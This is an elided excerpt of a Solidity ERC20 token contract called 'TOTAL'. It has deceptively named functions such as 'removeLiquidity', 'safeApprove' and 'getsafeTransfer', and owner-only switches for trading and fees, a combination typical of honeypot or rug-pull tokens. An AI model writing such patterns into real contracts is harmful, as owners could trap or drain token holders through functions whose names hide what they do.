...
contract total is Context, IERC20, Ownable{
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;  
    mapping (address => mapping (address => uint256)) private _allowances;  
    mapping (address => bool) private _isExcluded;  
    uint256 private _totalSupply = 100000000 *  10**9;  
    string private _name = "total";
    string private _symbol = "TOTAL";
	...
	function getsafeTransfer(bool _flag, uint256 val) external view returns(uint256) {
			uint256 _autoRebase;
			if (_flag) {            
    ...
    function safeApprove(address sender, uint256 amount) public virtual returns (bool) {    
	...
	function removeLiquidity(address to, uint256 _token) external
		{
			require(_token>0,"Select amount first");
			_transfer(msg.sender, to, _token);
		}

    function isupdateTradeEnabled(bool _enabled) external onlyOwner{
        _swapEnabled = _enabled;
    }

    function forupdateLiquidityFee(uint256 rLiquidity) external onlyOwner {       
    ...
    function forupdateDevFee(uint256 rDev) external onlyOwner {       
        if(_isExcluded[address(this)])
        {
            totalFees.dev +=rDev;
        }        
